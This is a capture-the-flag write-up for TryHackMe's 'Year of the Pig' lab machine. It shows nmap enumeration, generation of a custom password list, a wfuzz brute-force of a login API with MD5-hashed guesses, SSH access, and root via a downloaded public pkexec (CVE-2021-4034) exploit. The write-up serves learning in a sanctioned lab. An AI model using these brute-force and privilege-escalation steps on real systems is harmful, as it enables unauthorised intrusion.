---
categories: [TryHackMe]
description: Some pigs do fly...
tags: [ Fuzzing, PrivEsc, SUIDs, pkexec, wfuzz, cewl]
media_subpath: /assets/images/
image:
  alt: Linux Hard Level Machine 👹
  width: "1200"
  height: "630"
  path: https://tryhackme-images.s3.amazonaws.com/room-icons/dda3408fbc3312849968eadbfe72df74.jpeg
---

| Machine Link       | [https://tryhackme.com/r/room/yearofthepig](https://tryhackme.com/r/room/yearofthepig) |
| ------------------ | -------------------------------------------------------------------------------------- |
| Operating System   | <mark style="background: #FFF3A3A6;">Linux</mark>                                                                                  |
| Difficulty         | <mark style="background: #FF5582A6;"> Hard </mark>                                                                                   |
| Machine Created by | [MuirlandOracle](https://tryhackme.com/p/MuirlandOracle)                               |
|                    |                                                                                        |

## Port Scan Results ⤵️

```bash
┌──(kali㉿kali)-[~/Downloads/Tryhackme/Year_of_the_Pig]
└─$ sudo nmap -sC -sV --open 10.10.34.97 
Host is up (0.23s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Marcos Blog
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
{: .nolineno}
{: file='Nmap_Results.txt' .nolineno}

## Web Enumeration ⤵️

I checked port 80 and got this page 🔽

![Image](Pasted%20image%2020240326094415.png)
_Dashboard Page_

I got this login page where after entering some default credentials I got this error message as ⏬

![Image](Pasted%20image%2020240327203006.png)
_login.php Page_

I think I need to create a wordlists that comprise of these conditions.

I created the `wordlist` through <mark style="background: #FF5582A6;">cewl</mark> tool that takes all the keywords of the site and make a `wordlist` out of it 🔽

```bash
┌──(kali㉿kali)-[~/Downloads/Tryhackme/Year_of_the_Pig]
└─$ cewl http://10.10.41.180/ > file.txt
```
{: .nolineno}

To make all the password values as lowercase I used this **trim** command 🔽
```bash
┌──(kali㉿kali)-[~/Downloads/Tryhackme/Year_of_the_Pig]
└─$ cat file.txt | tr '[:upper:]' '[:lower:]' > wordlist.txt
```
{: .nolineno}

For making the wordlist that is followed by two numbers and a special character I used this custom made python script 🔽

```python
import itertools

# List of special characters
special_characters = ['!', '@', '#', '$', '%', '^', '&', '*']

# Read words from wordlist file
wordlist_file = "/home/kali/Downloads/Tryhackme/Year_of_the_Pig/wordlist.txt"  # Replace "your_wordlist_file.txt" with your wordlist file name
with open(wordlist_file, "r") as file:
    words = file.read().splitlines()

# Generate all combinations
passwords = []
for word in words:
    for num_combo in itertools.product(range(10), repeat=2):
        for special_char in special_characters:
            password = f"{word}{num_combo[0]}{num_combo[1]}{special_char}"
            passwords.append(password)

# Write to file
with open("modified_wordlist.txt", "w") as file:
    for password in passwords:
        file.write(password + "\n")

print("Wordlist generated successfully!")
```
{: .nolineno}
{: file: password.py}

Lets use it Now : 
```bash
┌──(kali㉿kali)-[~/Downloads/Tryhackme/Year_of_the_Pig]
└─$ python3 password.py    
Wordlist generated successfully!
```
{: .nolineno}

Now I have 134400 numbers of passwords . 

```bash
┌──(kali㉿kali)-[~/Downloads/Tryhackme/Year_of_the_Pig]
└─$ wc modified_wordlist.txt 
 134400  140000 1293600 modified_wordlist.txt
```
{: .nolineno}

When Login I noticed this MD5 implementation in password field 🔽

![Image](Pasted%20image%2020240327203540.png)
_Password is MD5 hashed_

So for this hashing + bruteforcing with a wordlist I used this Tool <mark style="background: #FF5582A6;">wfuzz</mark>
That will take -z flag as input of `wordlist file + hashing` algorithm in it and try it with <span style="color:#ffc000">marco</span> as username .

```bash
┌──(kali㉿kali)-[~/Downloads/Tryhackme/Year_of_the_Pig]
└─$ wfuzz -c -z file,modified_wordlist.txt,md5 -X POST -u http://10.10.6.83/api/login -d '{"username":"marco","password":"FUZZ"}' --hh 63 \
-H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0" \
-H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" \
-H "Accept-Language: en-US,en;q=0.5" \
-H "Accept-Encoding: gzip, deflate, br" \
-H "Connection: close" \
-H "Upgrade-Insecure-Requests: 1" \
-H "Content-Type: application/x-www-form-urlencoded"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.6.83/api/login
Total requests: 134400

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                  
=====================================================================

000025766:   500        0 L      0 W        0 Ch        "201350fc21c42d769152f1186cb465b2"                       
000025768:   500        0 L      0 W        0 Ch        "375af69ffa42147b2e1f62908436d4d3"                       
000025769:   200        0 L      3 W        99 Ch       "e..............................c"                       
```
{: .nolineno}

Now I got the password `md5` hash lets crack it with this [online hashes site](https://hashes.com/en/decrypt/hash) Tool🔻

![Image](Pasted%20image%2020240327194123.png)
_password hash_

Lets Login Now ⏭️

![Image](Pasted%20image%2020240327194841.png)
_Dashboard Page_

### SSH Shell 🔽

```bash
┌──(kali㉿kali)-[~/Downloads/Tryhackme/Year_of_the_Pig]
└─$ ssh marco@10.10.34.97                        
The authenticity of host '10.10.34.97 (10.10.34.97)' can not be established.
ED25519 key fingerprint is SHA256:NA6wxwks9yC9RRUsw12szoz+dTUjJXyA37m9dSsUCa8.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.34.97' (ED25519) to the list of known hosts.
marco@10.10.34.97s password: 

	
	__   __                       __   _   _            ____  _       
	\ \ / /__  __ _ _ __    ___  / _| | |_| |__   ___  |  _ \(_) __ _ 
	 \ V / _ \/ _` | '__|  / _ \| |_  | __| '_ \ / _ \ | |_) | |/ _` |
	  | |  __/ (_| | |    | (_) |  _| | |_| | | |  __/ |  __/| | (_| |
	  |_|\___|\__,_|_|     \___/|_|    \__|_| |_|\___| |_|   |_|\__, |
	                                                            |___/ 


marco@year-of-the-pig:~$ whoami
marco
marco@year-of-the-pig:~$ id
uid=1000(marco) gid=1000(marco) groups=1000(marco),1002(web-developers)
marco@year-of-the-pig:~$ 
```
{: .nolineno}

Now I checked <mark style="background: #D2B3FFA6;">SUIDs</mark> and got <mark style="background: #FF5582A6;">pkexec</mark> as SUIDs permitted so I uploaded an exploit related to pkexec from [here](https://github.com/Almorabea/pkexec-exploit/tree/main) and ran it .

```bash
marco@year-of-the-pig:~$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/newuidmap
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/traceroute6.iputils
/usr/bin/at
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/bin/mount
/bin/fusermount
/bin/ping
/bin/su
/bin/umount
marco@year-of-the-pig:~$ 
marco@year-of-the-pig:~$ /usr/bin/pkexec --version
pkexec version 0.105
marco@year-of-the-pig:~$
```
{: .nolineno}

Lets upload our payload here ⏬

```bash
marco@year-of-the-pig:~$ wget http://10.11.75.200/pkexec_CVE-2021-4034.py
--2024-03-27 14:44:25--  http://10.11.75.200/pkexec_CVE-2021-4034.py
Connecting to 10.11.75.200:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3067 (3.0K) [text/x-python]
Saving to: ‘pkexec_CVE-2021-4034.py’

pkexec_CVE-2021-4034.py        100%[==================================================>]   3.00K  --.-KB/s    in 0.002s  

2024-03-27 14:44:26 (1.86 MB/s) - ‘pkexec_CVE-2021-4034.py’ saved [3067/3067]

marco@year-of-the-pig:~$ chmod +x pkexec_CVE-2021-4034.py 
marco@year-of-the-pig:~$ python3 pkexec_CVE-2021-4034.py 
Do you want to choose a custom payload? y/n (n use default payload)  n
[+] Cleaning pervious exploiting attempt (if exist)
[+] Creating shared library for exploit code.
[+] Finding a libc library to call execve
[+] Found a library at <CDLL 'libc.so.6', handle 7fe8772f7000 at 0x7fe8771787b8>
[+] Call execve() with chosen payload
[+] Enjoy your root shell
# whoami
root
# /bin/bash -i
root@year-of-the-pig:/home/marco# cd /root
root@year-of-the-pig:/root# ls -al
total 36
drwx------  5 root root 4096 Aug 22  2020 .
drwxr-xr-x 22 root root 4096 Aug 16  2020 ..
lrwxrwxrwx  1 root root    9 Aug 16  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  2 root root 4096 Aug 16  2020 .cache
drwx------  3 root root 4096 Aug 16  2020 .gnupg
drwxr-xr-x  3 root root 4096 Aug 21  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   42 Aug 16  2020 .vimrc
-r--------  1 root root   38 Aug 22  2020 root.txt
root@year-of-the-pig:/root# cat root.txt
THM{FLAG_FLAG_FLAG_FLAG_FLAG_FLAG}
root@year-of-the-pig:/root# 
```
{: .nolineno}
I am root now !!